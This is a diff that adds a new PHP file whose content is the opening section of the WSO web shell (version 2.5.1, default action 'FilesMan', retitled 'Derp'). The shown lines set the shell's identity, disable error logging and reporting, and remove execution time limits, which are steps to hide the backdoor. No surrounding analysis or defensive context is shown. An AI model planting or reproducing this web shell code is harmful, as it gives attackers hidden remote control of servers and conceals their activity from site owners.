@@ -1,0 +1,22 @@
+<?php
+$color = "darkturquoise";
+$default_action = 'FilesMan';
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+$font1 = '10px Verdana, sans-serif';
+$font2 = '14pt Verdana, sans-serif';
+
+@define('WSO_VERSION', '2.5.1');
+$shell_title =  ' - Derp ' . WSO_VERSION;
+
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@set_time_limit(0);
+@set_magic_quotes_runtime(0);
+
+$safe_mode = @ini_get('safe_mode');
+if (!$safe_mode) {
+    error_reporting(0);
+}
+
